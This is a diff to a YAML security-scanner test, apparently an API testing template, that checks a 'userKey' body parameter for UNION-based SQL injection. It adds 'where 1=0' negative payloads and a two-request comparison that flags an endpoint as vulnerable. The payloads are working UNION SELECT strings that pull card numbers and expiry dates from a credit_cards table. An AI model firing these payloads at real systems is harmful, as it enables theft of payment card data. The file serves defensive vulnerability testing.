@@ -88,60 +88,117 @@ wordLists:
     - "' UNION SELECT card_number, card_expiry FROM credit_cards /*-"
     - "' UNION SELECT card_number, card_expiry FROM credit_cards /* --"
     - "' UNION SELECT card_number, card_expiry FROM credit_cards /* -"
+  unionBasedNegativePayloads:
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0 --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /*"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0 --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /* '"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /*--"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0 -- -"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /*-"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /* --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /* -"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${userVal}${unionBasedPayloads}
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-      - Attention Required!
-      - CloudFlare
-      - Sorry, you have been blocked
-      - " UNION SELECT "
-      - " FROM "
-    contains_either:
-      - credit
-      - card
-      - cardholder
-      - cvv
-      - expiry
-      - card_number
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - credit
+            - card
+            - cardholder
+            - cvv
+            - expiry
+            - card_number
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " UNION SELECT "          
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${unionBasedNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0 
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - " UNION SELECT "
+            - credit
+            - card
+            - cardholder
+            - cvv
+            - expiry
+            - card_number
 
-
-  
-  
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit                                             
